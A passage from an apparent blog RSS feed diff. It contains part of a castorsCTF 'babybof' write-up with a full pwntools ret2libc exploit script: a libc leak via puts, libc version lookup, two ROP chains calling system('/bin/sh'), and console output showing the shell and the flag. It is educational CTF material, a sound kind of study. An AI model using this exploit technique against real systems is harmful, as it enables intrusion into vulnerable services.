+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Leaked libc address,  __libc_start_main: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(leak))
+
+p<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Let&rsquo;s run the script:</p>
+<pre><code class="language-console" data-lang="console">$ python3 leak.py
+[+] Opening connection to chals20.cybercastors.com on port 14425: Done
+[*] 'bof'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+[*] Loaded 14 cached gadgets for './bof'
+[*] puts@plt: 0x400590
+[*] __libc_start_main: 0x600ff0
+[*] pop rdi gadget: 0x4007f3
+b'Welcome to the cybercastors Babybof\n'
+b'Say your name: '
+b'\xc0?m \xd7\x7f'
+[*] Leaked libc address,  __libc_start_main: 0x7fd7206d3fc0
+[*] Closed connection to chals20.cybercastors.com port 14425
+</code></pre><p>We see that for this particular run, the address of <code>__libc_start_main</code> was 0x7fd7206d3fc0.<br>
+We need to find out what version of libc is running on the server since different versions have different offsets between the base and functions.</p>
+<p>Luckily there&rsquo;s a tool that finds the right libc version for you based on the address of a libc function.</p>
+<p>Download the database and tools <a href="https://github.com/niklasb/libc-database">here</a> and then run the following:</p>
+<pre><code class="language-console" data-lang="console">$ ./find __libc_start_main 0x7fd7206d3fc0 
+http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.31-0ubuntu9_amd64.deb (id libc6_2.31-0ubuntu9_amd64)
+</code></pre><p>This shows us that the server was using the libc6_2.31-0ubuntu9_amd64 version. We can use <code>download libc6_2.31-0ubuntu9_amd64</code> to download that libc version.</p>
+<p>Note: There is also an online libc database at [https://libc.blukat.me/], but it only works sometimes since its database probably isn&rsquo;t as comphrehensive.</p>
+<h3 id="exploit">Exploit</h3>
+<p>We can use the pwntools python library to find libc offsets.</p>
+<p>This calculates the base libc address by subtracting the offset from __libc_start_main</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__libc_start_main&#34;</span>]
+</code></pre></div><p>Then by using this libc base address we can find the addresses of system() and &ldquo;/bin/sh&rdquo; to spawn a shell.<br>
+Using pwntools:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">BINSH <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>)) <span style="color:#75715e">#Verify with find /bin/sh</span>
+SYSTEM <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]
+</code></pre></div><p>For our exploit, we need to be able to call main() twice: once to leak libc and another time to call system().<br>
+We can just append the address of main() to our first ROP chain to accomplish this.</p>
+<p>First ROP chain:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">base <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#75715e">#Overflow buffer until return address</span>
+rop <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(LIBC_START_MAIN) <span style="color:#f92672">+</span>  p64(PUTS) <span style="color:#f92672">+</span> p64(MAIN)
+</code></pre></div><p>Then our second rop chain will call system:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">rop2 <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(RET) <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(BINSH) <span style="color:#f92672">+</span> p64(SYSTEM)
+</code></pre></div><p>Combine the above into a script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#e6db74">&#34;&#34;&#34; The following script was based heavily on the script provided in the following url &#34;&#34;&#34;</span>
+<span style="color:#e6db74">&#34;&#34;&#34;           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              &#34;&#34;&#34;</span>
+
+<span style="color:#75715e">#!/usr/bin/python3</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span> <span style="color:#75715e"># Import pwntools</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chals20.cybercastors.com&#34;</span>, <span style="color:#ae81ff">14425</span>)
+<span style="color:#75715e">#p = process(&#34;./bof&#34;) # start the vuln binary</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bof&#34;</span>) <span style="color:#75715e"># Extract data from binary</span>
+rop <span style="color:#f92672">=</span> ROP(elf) <span style="color:#75715e"># Find ROP gadgets</span>
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)
+
+<span style="color:#75715e"># Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget</span>
+PUTS <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
+LIBC_START_MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]
+POP_RDI <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>]))[<span style="color:#ae81ff">0</span>] <span style="color:#75715e"># Same as ROPgadget --binary vuln | grep &#34;pop rdi&#34;</span>
+RET <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>]))[<span style="color:#ae81ff">0</span>]
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;puts@plt: &#34;</span> <span style="color:#f92672">+</span> hex(PUTS))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;__libc_start_main: &#34;</span> <span style="color:#f92672">+</span> hex(LIBC_START_MAIN))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;pop rdi gadget: &#34;</span> <span style="color:#f92672">+</span> hex(POP_RDI))
+
+base <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#75715e">#Overflow buffer until return address</span>
+<span style="color:#75715e"># Create rop chain</span>
+rop <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(LIBC_START_MAIN) <span style="color:#f92672">+</span>  p64(PUTS) <span style="color:#f92672">+</span> p64(MAIN)
+
+<span style="color:#75715e">#Send our rop-chain payload</span>
+p<span style="color:#f92672">.</span>sendline(rop)
+
+<span style="color:#75715e">#Parse leaked address</span>
+print(p<span style="color:#f92672">.</span>recvline())
+print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;name: &#34;</span>))
+received <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()
+received <span style="color:#f92672">=</span> received<span style="color:#f92672">.</span>strip()
+print(received)
+leak <span style="color:#f92672">=</span> u64(received<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Leaked libc address,  __libc_start_main: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(leak))
+
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__libc_start_main&#34;</span>]
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Address of libc </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span> hex(libc<span style="color:#f92672">.</span>address))
+
+BINSH <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>)) <span style="color:#75715e">#Verify with find /bin/sh</span>
+SYSTEM <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;bin/sh </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span> hex(BINSH))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;system </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span> hex(SYSTEM))
+
+rop2 <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(RET) <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(BINSH) <span style="color:#f92672">+</span> p64(SYSTEM)
+p<span style="color:#f92672">.</span>sendline(rop2)
+p<span style="color:#f92672">.</span>interactive()
+p<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Run the script:</p>
+<pre><code class="language-console" data-lang="console">$ python3 exploit.py
+[+] Opening connection to chals20.cybercastors.com on port 14425: Done
+[*] '/home/user/castorsctf/babybof1pt2/bof'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+[*] Loaded 14 cached gadgets for './bof'
+[*] '/home/user/castorsctf/babybof1pt2/libc-2.31.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] puts@plt: 0x400590
+[*] __libc_start_main: 0x600ff0
+[*] pop rdi gadget: 0x4007f3
+b'Welcome to the cybercastors Babybof\n'
+b'Say your name: '
+b'\xc0\xef\xe2\xa4o\x7f'
+[*] Leaked libc address,  __libc_start_main: 0x7f6fa4e2efc0
+[*] Address of libc 0x7f6fa4e08000 
+[*] bin/sh 0x7f6fa4fbf5aa 
+[*] system 0x7f6fa4e5d410 
+[*] Switching to interactive mode
+Welcome to the cybercastors Babybof
+Say your name: /bin/sh: 0: can't access tty; job control turned off
+$ $ ls
+babybof  flag.txt  shell_flag.txt
+$ $ cat shell_flag.txt
+castorsCTF{w0w_U_jU5t_h4ck3d_th15!!1_c4ll_th3_c0p5!11}
+$ $  
+</code></pre><p>Note: during the actual ctf, there was a weird buffering issue, so I had to run exploit_buf.py around 100 times to get a shell.<br>
+Towards the end of the ctf, the organizers fixed the buffering issue, so running exploit.py just once will now work.</p>
+<p>Also if you see any inaccuracies anywhere, feel free to <a href="mailto:jacobshin313@gmail.com">contact</a> me!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Welcome to my site.</title>
+            <link>/posts/welcome/</link>
+            <pubDate>Sun, 14 Jun 2020 22:52:22 -0400</pubDate>
+            
+            <guid>/posts/welcome/</guid>
+            <description>This is just a test post. </description>
+            <content type="html"><![CDATA[<h2 id="this-is-just-a-test-post">This is just a test post.</h2>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
